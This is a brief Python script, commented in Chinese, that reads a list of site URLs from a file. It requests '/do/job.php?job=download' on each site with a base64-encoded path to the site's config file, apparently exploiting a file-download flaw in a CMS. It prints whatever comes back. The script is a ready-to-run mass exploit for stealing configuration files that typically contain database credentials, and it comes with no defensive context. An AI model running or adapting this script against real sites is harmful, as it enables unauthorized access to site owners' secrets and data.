import requests

# 定义请求头
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1'
}

# 从urls.txt文件中读取URL列表
with open('urls.txt', 'r') as f:
    urls = f.readlines()

# 遍历URL列表并发送GET请求
for url in urls:
    # 使用strip()方法去除URL两端的空格和换行符
    url = url.strip()
    try:
        # 向url发送GET请求，并传递请求头和请求参数
        response = requests.get(url + '/do/job.php?job=download&url=ZGF0YS9jb25maWcucGg8', headers=headers, timeout=30)
        # 判断HTTP响应状态码是否为200
        if response.status_code != 200:
            # 如果不是200，则跳过当前URL，继续遍历下一个URL
            print(f"URL {url} 响应状态码为 {response.status_code}，跳过当前URL。")
            continue
        # 打印响应内容
        response.encoding = 'gbk'
        print(response.text)
    except requests.exceptions.RequestException as e:
        # 处理HTTP请求错误
        print(f"URL {url} HTTP请求错误：{e}")
        continue
